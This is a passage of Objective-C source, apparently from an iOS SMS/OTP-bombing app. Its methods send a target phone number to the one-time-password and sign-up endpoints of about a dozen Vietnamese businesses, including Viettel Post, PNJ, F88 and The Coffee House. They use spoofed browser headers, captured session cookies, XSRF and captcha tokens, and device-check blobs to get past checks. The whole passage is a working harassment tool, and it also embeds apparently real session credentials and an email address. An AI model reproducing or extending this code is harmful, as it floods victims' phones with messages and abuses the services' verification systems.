        @"sec-ch-ua": @"\"Microsoft Edge\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
        @"sec-ch-ua-mobile": @"?0",
        @"sec-ch-ua-platform": @"\"macOS\"",
        @"sec-fetch-dest": @"empty",
        @"sec-fetch-mode": @"cors",
        @"sec-fetch-site": @"same-origin",
        @"secret": @"bPG0upAJLk0gz/2W1baS2Q==",
        @"user-agent": @"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0"
    };
    NSString *phoneNumber = self.phoneTextField.text;
    NSString *jsonString = [NSString stringWithFormat:@"{\"phone_number\":\"%@\",\"email\":\"thanhtrungdfgd0@gmail.com\",\"type\":0,\"is_register\":true}", phoneNumber];
    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setAllHTTPHeaderFields:headers];
    [request setHTTPBody:data];

    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            [self logMessage:[NSString stringWithFormat:@"dominos Error: %@", error.localizedDescription]];
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
            [self logMessage:[NSString stringWithFormat:@"dominos Response: %ld", (long)httpResponse.statusCode]];
        }
    }];
    [dataTask resume];
}

-(void)batdongsan {
    NSString *phoneNumber = self.phoneTextField.text;
    NSString *urlString = [NSString stringWithFormat:@"https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister?phoneNumber=%@", phoneNumber];
    NSURL *url = [NSURL URLWithString:urlString];
    NSDictionary *headers = @{
        @"accept": @"application/json, text/plain, */*",
        @"accept-language": @"vi,en-US;q=0.9,en;q=0.8",
        @"cookie": @"con.ses.id=905ef1fa-2e87-4390-9339-e07226518977; con.unl.lat=1733158800; con.unl.sc=1; _cfuvid=2OmNJNjqWFBEcuBAMumkv8ersCUGlrAYlGKrInnIKYs-1733233804827-0.0.1.1-604800000; g_state={\"i_p\":1733241010845,\"i_l\":1}; con.unl.usr.id=%7B%22key%22%3A%22userId%22%2C%22value%22%3A%22e6860852-4b1c-4da3-a73b-5b4f9e28b516%22%2C%22expireDate%22%3A%222025-12-03T20%3A50%3A11.8727444Z%22%7D; con.unl.cli.id=%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%2256e45f3c-c755-49a6-a4cd-0466a21544da%22%2C%22expireDate%22%3A%222025-12-03T20%3A50%3A11.8727901Z%22%7D",
        @"dnt": @"1",
        @"priority": @"u=1, i",
        @"referer": @"https://batdongsan.com.vn/sellernet/internal-sign-up",
        @"sec-ch-ua": @"\"Microsoft Edge\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
        @"sec-ch-ua-mobile": @"?0",
        @"sec-ch-ua-platform": @"\"macOS\"",
        @"sec-fetch-dest": @"empty",
        @"sec-fetch-mode": @"cors",
        @"sec-fetch-site": @"same-origin",
        @"user-agent": @"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0"
    };

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setAllHTTPHeaderFields:headers];

    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            [self logMessage:[NSString stringWithFormat:@"batdongsan Error: %@", error.localizedDescription]];
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
            [self logMessage:[NSString stringWithFormat:@"batdongsan Response: %ld", (long)httpResponse.statusCode]];
        }
    }];
    [dataTask resume];
}

-(void)fahase {
    NSURL *url = [NSURL URLWithString:@"https://www.fahasa.com/ajaxlogin/ajax/checkPhone"];
    NSDictionary *headers = @{
        @"accept": @"application/json, text/javascript, */*; q=0.01",
        @"accept-language": @"vi,en-US;q=0.9,en;q=0.8",
        @"content-type": @"application/x-www-form-urlencoded; charset=UTF-8",
        @"cookie": @"frontend=50a13170c4f044f082e856d55447dbdb; frontend_cid=4Kp3SiILRNU1jE3a",
        @"dnt": @"1",
        @"origin": @"https://www.fahasa.com",
        @"priority": @"u=1, i",
        @"referer": @"https://www.fahasa.com/customer/account/login/referer/aHR0cHM6Ly93d3cuZmFoYXNhLmNvbS9jdXN0b21lci9hY2NvdW50L2luZGV4Lw,,/",
        @"sec-ch-ua": @"\"Microsoft Edge\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
        @"sec-ch-ua-mobile": @"?0",
        @"sec-ch-ua-platform": @"\"macOS\"",
        @"sec-fetch-dest": @"empty",
        @"sec-fetch-mode": @"cors",
        @"sec-fetch-site": @"same-origin",
        @"user-agent": @"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
        @"x-requested-with": @"XMLHttpRequest"
    };
    NSString *phoneNumber = self.phoneTextField.text;
    NSString *jsonString = [NSString stringWithFormat:@"phone=%@", phoneNumber];
    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setAllHTTPHeaderFields:headers];
    [request setHTTPBody:data];

    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            [self logMessage:[NSString stringWithFormat:@"fahasa Error: %@", error.localizedDescription]];
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
            [self logMessage:[NSString stringWithFormat:@"fahasa Response: %ld", (long)httpResponse.statusCode]];
        }
    }];
    [dataTask resume];
}

-(void)shopiness {
    NSURL *url = [NSURL URLWithString:@"https://shopiness.vn/ajax/user"];
    NSDictionary *headers = @{
        @"Accept": @"*/*",
        @"Accept-Language": @"vi,en-US;q=0.9,en;q=0.8",
        @"Connection": @"keep-alive",
        @"Content-Type": @"application/x-www-form-urlencoded; charset=UTF-8",
        @"DNT": @"1",
        @"Origin": @"https://shopiness.vn",
        @"Referer": @"https://shopiness.vn/",
        @"Sec-Fetch-Dest": @"empty",
        @"Sec-Fetch-Mode": @"cors",
        @"Sec-Fetch-Site": @"same-origin",
        @"User-Agent": @"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
        @"X-Requested-With": @"XMLHttpRequest",
        @"sec-ch-ua": @"\"Microsoft Edge\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
        @"sec-ch-ua-mobile": @"?0",
        @"sec-ch-ua-platform": @"\"macOS\""
    };
    NSString *phoneNumber = self.phoneTextField.text;
    NSString *formattedString = [NSString stringWithFormat:@"action=verify-registration-info&phoneNumber=%@&refCode=", phoneNumber];
    NSMutableData *data = [[NSMutableData alloc] initWithData:[formattedString dataUsingEncoding:NSUTF8StringEncoding]];
    [data appendData:[@"&refCode=" dataUsingEncoding:NSUTF8StringEncoding]];

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setAllHTTPHeaderFields:headers];
    [request setHTTPBody:data];

    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            [self logMessage:[NSString stringWithFormat:@"shopiness Error: %@", error.localizedDescription]];
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
            [self logMessage:[NSString stringWithFormat:@"shopiness Response: %ld", (long)httpResponse.statusCode]];
        }
    }];
    [dataTask resume];
}

-(void)viettelpost {
    
    NSURL *url = [NSURL URLWithString:@"https://otp-verify.okd.viettelpost.vn/api/otp/sendOTP"];
    NSDictionary *headers = @{
        @"User-Agent": @"ViettelPost/2 CFNetwork/1474 Darwin/23.0.0",
        @"Accept": @"application/json, text/plain, */*",
        @"content-type": @"application/json;charset=utf-8",
        @"accept-language": @"vi-VN,vi;q=0.9"
    };
    NSString *phoneNumber = self.phoneTextField.text;
    NSString *jsonString = [NSString stringWithFormat:@"{\"account\":\"%@\",\"function\":\"SSO_REGISTER\",\"type\":\"PHONE\",\"otpType\":\"NUMBER\"}", phoneNumber];
    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];
    
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setAllHTTPHeaderFields:headers];
    [request setHTTPBody:data];

    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            [self logMessage:[NSString stringWithFormat:@"viettelpost Error: %@", error.localizedDescription]];
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
            [self logMessage:[NSString stringWithFormat:@"viettelpost Response: %ld", (long)httpResponse.statusCode]];
        }
    }];
    [dataTask resume];
}

-(void)bibabo {
    NSString *phoneNumber = self.phoneTextField.text;
    NSString *urlString = [NSString stringWithFormat:@"https://one.bibabo.vn/api/v1/login/otp/createOtp?phone=%@&reCaptchaToken=undefined&appId=7&version=2", phoneNumber];
    NSURL *url = [NSURL URLWithString:urlString];
    NSDictionary *headers = @{
        @"User-Agent": @"bibabo/557 CFNetwork/1474 Darwin/23.0.0",
        @"Accept": @"application/json, text/plain, */*",
        @"accept-language": @"vi-VN,vi;q=0.9"
    };

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setAllHTTPHeaderFields:headers];

    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            [self logMessage:[NSString stringWithFormat:@"bibabo Error: %@", error.localizedDescription]];
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
            [self logMessage:[NSString stringWithFormat:@"bibabo Response: %ld", (long)httpResponse.statusCode]];
        }
    }];
    [dataTask resume];
}

-(void)owen {
    NSURL *url = [NSURL URLWithString:@"https://owen.vn/otp/otp/send"];
    NSDictionary *headers = @{
        @"accept": @"*/*",
        @"accept-language": @"vi,en-US;q=0.9,en;q=0.8",
        @"content-type": @"application/x-www-form-urlencoded; charset=UTF-8",
        @"cookie": @"form_key=Ownny67JDH1j7NSE; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; form_key=Ownny67JDH1j7NSE; PHPSESSID=bb1ef534be4569b12516006cb96ea32c; mage-messages=; private_content_version=4adc8fc71bef89952c65bba42f5767a2; section_data_ids=%7B%22insiderSection%22%3A1733311393%7D",
        @"dnt": @"1",
        @"origin": @"https://owen.vn",
        @"priority": @"u=1, i",
        @"referer": @"https://owen.vn/customer/account/create/",
        @"sec-ch-ua": @"\"Microsoft Edge\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
        @"sec-ch-ua-mobile": @"?0",
        @"sec-ch-ua-platform": @"\"macOS\"",
        @"sec-fetch-dest": @"empty",
        @"sec-fetch-mode": @"cors",
        @"sec-fetch-site": @"same-origin",
        @"user-agent": @"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
        @"x-requested-with": @"XMLHttpRequest"
    };
    NSString *phoneNumber = self.phoneTextField.text;
    NSString *jsonString = [NSString stringWithFormat:@"mobileNumber=%@", phoneNumber];
    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];
    [data appendData:[@"&maxTimesToResend=2" dataUsingEncoding:NSUTF8StringEncoding]];
    [data appendData:[@"&timeAlive=180" dataUsingEncoding:NSUTF8StringEncoding]];
    [data appendData:[@"&timeCountDownToResend=300" dataUsingEncoding:NSUTF8StringEncoding]];
    [data appendData:[@"&form_key=Ownny67JDH1j7NSE" dataUsingEncoding:NSUTF8StringEncoding]];

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setAllHTTPHeaderFields:headers];
    [request setHTTPBody:data];

    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            [self logMessage:[NSString stringWithFormat:@"owen Error: %@", error.localizedDescription]];
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
            [self logMessage:[NSString stringWithFormat:@"owen Response: %ld", (long)httpResponse.statusCode]];
        }
    }];
    [dataTask resume];
}

-(void)pnj {
    NSURL *url = [NSURL URLWithString:@"https://www.pnj.com.vn/customer/otp/request"];
    NSDictionary *headers = @{
        @"accept": @"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        @"accept-language": @"vi,en-US;q=0.9,en;q=0.8",
        @"cache-control": @"max-age=0",
        @"content-type": @"application/x-www-form-urlencoded",
        @"cookie": @"CDPI_VISITOR_ID=84d0681b-23c5-4cb1-9721-1ce28821a192; CDPI_RETURN=New; CDPI_SESSION_ID=16ccae96-47f2-412c-97ec-7c60fa74597a; XSRF-TOKEN=eyJpdiI6InI3b0NtRmJKcDMvNmNKZEVxSkcyenc9PSIsInZhbHVlIjoiUnltaWJraFRRc2dwbnJPZU5MUXJURkxwVGNsYmNjYm5jb0JkSnFqS1BLRVI3dXZvSytsZUNoSlNlVCtpck5iSUxYTElpelVVUDhYbFg3and5VHFheGpPTU4rd3lMc1FzTE1FOWxqS2VKZXlJQmprWU83bGpHQkxqTHFhdjZZRWIiLCJtYWMiOiI3NjFhZjFmOTA1ZDQ5ZmJlMmY2N2U0NTg5MjljMjMxZmVkYTMyYzExYzMxOThiYzMxMmNkNTlhOTRmM2U0OTFkIiwidGFnIjoiIn0%3D; mypnj_session=eyJpdiI6IkdmcUN2TnBkWG1XWk5XTEVCK3hCN0E9PSIsInZhbHVlIjoibFNUdzhxSGRtNndreWQ4Ymh6WVRrOEtSUmZ5OU00SlZVSTA4cFFBK0M2cnl6clVGOVp5dHFEWm1hYkdDRXhpSDYzTy80QVJ3ZWY0Y1pRbllFSzF5VDgrWWhkV0lvTk56MmJCRDJJai9xWFZsd0NObk1mWHFyR2pTV0dHcW1VSDQiLCJtYWMiOiJjMjFiNThjMmMxZDY3MjhiNWRiNTdjMWYxMDVkODZkZmEyNTYwMDVmNzIzYjVkYzY2NzI1YzdlOWUxZWViMDQ3IiwidGFnIjoiIn0%3D",
        @"dnt": @"1",
        @"origin": @"https://www.pnj.com.vn",
        @"priority": @"u=0, i",
        @"referer": @"https://www.pnj.com.vn/customer/login",
        @"sec-ch-ua": @"\"Microsoft Edge\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
        @"sec-ch-ua-mobile": @"?0",
        @"sec-ch-ua-platform": @"\"macOS\"",
        @"sec-fetch-dest": @"document",
        @"sec-fetch-mode": @"navigate",
        @"sec-fetch-site": @"same-origin",
        @"sec-fetch-user": @"?1",
        @"upgrade-insecure-requests": @"1",
        @"user-agent": @"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0"
    };

    NSString *phoneNumber = self.phoneTextField.text;
    NSMutableData *data = [[NSMutableData alloc] initWithData:[@"_method=POST" dataUsingEncoding:NSUTF8StringEncoding]];
    [data appendData:[@"&_token=SiaxKHlIoAzr75dYUMOR6tQrcpD0DIGYqntwqyos" dataUsingEncoding:NSUTF8StringEncoding]];
    [data appendData:[@"&type=zns" dataUsingEncoding:NSUTF8StringEncoding]];
    [data appendData:[[NSString stringWithFormat:@"&phone=%@", phoneNumber] dataUsingEncoding:NSUTF8StringEncoding]];

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setAllHTTPHeaderFields:headers];
    [request setHTTPBody:data];

    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            [self logMessage:[NSString stringWithFormat:@"PNJ Error: %@", error.localizedDescription]];
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
            [self logMessage:[NSString stringWithFormat:@"PNJ Response: %ld", (long)httpResponse.statusCode]];
        }
    }];
    [dataTask resume];
}

-(void)f88 {
    NSURL *url = [NSURL URLWithString:@"https://api.f88.vn/growth/webf88vn/api/v1/Pawn"];
    NSDictionary *headers = @{
        @"accept": @"application/json, text/plain, */*",
        @"accept-language": @"vi,en-US;q=0.9,en;q=0.8",
        @"content-type": @"application/json",
        @"dnt": @"1",
        @"origin": @"https://f88.vn",
        @"priority": @"u=1, i",
        @"referer": @"https://f88.vn/",
        @"sec-ch-ua": @"\"Microsoft Edge\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
        @"sec-ch-ua-mobile": @"?0",
        @"sec-ch-ua-platform": @"\"macOS\"",
        @"sec-fetch-dest": @"empty",
        @"sec-fetch-mode": @"cors",
        @"sec-fetch-site": @"same-site",
        @"user-agent": @"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0"
    };
    NSString *phoneNumber = self.phoneTextField.text;
    NSString *jsonString = [NSString stringWithFormat:@"{\"FullName\":\"Nguyễn Quang Ngọc\",\"Phone\":\"%@\",\"DistrictCode\":\"001\",\"ProvinceCode\":\"01\",\"AssetType\":\"Motor\",\"IsChoose\":\"1\",\"ShopCode\":\"\",\"Url\":\"https://f88.vn/vay-theo-luong-thu-nhap-cong-nhan\",\"FormType\":1,\"TokenCapcha\":\"03AFcWeA49mQ8TXSbCrDh-_ubTkAyWlGjMQnMOtb-DgkfLAH2aLOCvKkj4522y5-C8fKinTrCrXgTtBz_iud1_kmHv7VfdQwuwDj-NxQlmzgovJ3mPdETsy4gi-CkBYinfjE45uxBahPKldLs5t0cKaI2A1kxZGeaOqN5rooUgTbCmSfSwzBdd9rcR_l1w-eDN0WID4VLhmqK74aCdhUX47B-a9RMlBZtcvdyE4mID5MegmIvcVexIomodN2PjftrHPCTvbz3LDmmrDMLkh607hNg0fsggkIsEfZi2ygXKu2dCboFOsG8-pjf51jrh50DVDDwnnPv7XS9EZYMTJAc2TqUyjz3JUsMkWNqnb4J4CxPS2fpasfwme6_nBRULkRxcfwM8gQiW-wnfK-AwyV3PJCgQNYE0ubt6l7y_XPXELGt-BXvaVAU989__0fy1hn_HMdlUj0VqbmaMtaiz_iPzC9mEGPNVOPk-UR9DSOvGOtI08tmtZXow2olZDAy-0b2DgvYegOOE-YbILoP3kqNGoXSu88Su4nCPAu3Hpd7atjJPNVB3_AcG2zUaMKasNSmpmi5wpMb-NjAawrnC198fh3StDItuiKgADLREZKqulb1EU9ZpIeoQYfeeoh7ITR-Wz1bWIq3oAMza9L17kJLnfYtuxtXBNgmGm1gjhr60zh1NrRmTBkLd9Ctgnj8t5fNYmEtjt0JY3TqDaSUmhcNris9b_EfzsfRtchabPmagz_psUryP6I_nucM1HsRz8fDIzExFYH-7tvsIyAvy3iEUegpET365pNXZHCkILJMuXkcw4sPsuKrt9N7RtRhxKgtZ-9Ve8a1lXlR5Fq9VQjfx4g6munXI6xnDtr6dvTvBNlGOC_MnEolw33bNzlXuSJaske_7v38Kzp-oMNfavqthwJdbIrCORmK5nw\"}", phoneNumber];
    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setAllHTTPHeaderFields:headers];
    [request setHTTPBody:data];

    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            [self logMessage:[NSString stringWithFormat:@"F88 Error: %@", error.localizedDescription]];
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
            [self logMessage:[NSString stringWithFormat:@"F88 Response: %ld", (long)httpResponse.statusCode]];
        }
    }];
    [dataTask resume];
}

-(void)heyu {
    NSURL *url = [NSURL URLWithString:@"https://api.heyu.asia/api/v2.1/member/send-code"];
    NSDictionary *headers = @{
        @"User-Agent": @"HeyU/3900071 CFNetwork/1474 Darwin/23.0.0",
        @"Accept": @"application/json, text/plain, */*",
        @"x-access-token": @"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQHRlc3QuY29tIiwicGFzc3dvcmQiOiJzaGVlcDEyMzQ1Njc4IiwiaWF0IjoxNDc0OTcwMzc3fQ.38hjO99PEhzk1IT8l16zbKemikhPHHAqZzsSw8lmWtE",
        @"content-type": @"application/json;charset=utf-8",
        @"goal": @"5668",
        @"accept-language": @"vi-VN,vi;q=0.9"
    };

    NSString *phoneNumber = self.phoneTextField.text; 

    NSString *jsonString = [NSString stringWithFormat:@"{\"phone\":\"%@\",\"deviceId\":\"33FC417B-681E-4C47-A0B8-DC98ED2F0BA8\",\"regionName\":\"\",\"modeApp\":\"\",\"platform\":\"ios\",\"nativeVersion\":\"3900071\",\"versionCodePush\":\"\",\"tShoot\":1733317445437}", phoneNumber];
    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setAllHTTPHeaderFields:headers];
    [request setHTTPBody:data];

    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            [self logMessage:[NSString stringWithFormat:@"heyu Error: %@", error.localizedDescription]];
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
            [self logMessage:[NSString stringWithFormat:@"heyu Response: %ld", (long)httpResponse.statusCode]];
        }
    }];
    [dataTask resume];
}

-(void)thecoffee {
    NSURL *url = [NSURL URLWithString:@"https://api.thecoffeehouse.com/api/v5/auth/request-otp"];
    NSDictionary *headers = @{
        @"User-Agent": @"(iPhone14ProMax; iOS 17.0.2)",
        @"Accept": @"application/json",
        @"Content-Type": @"application/json; charset=utf-8",
        @"TCH-APP-VERSION": @"5.9.30",
        @"TCH-APP-DEVICE-CHECK": @"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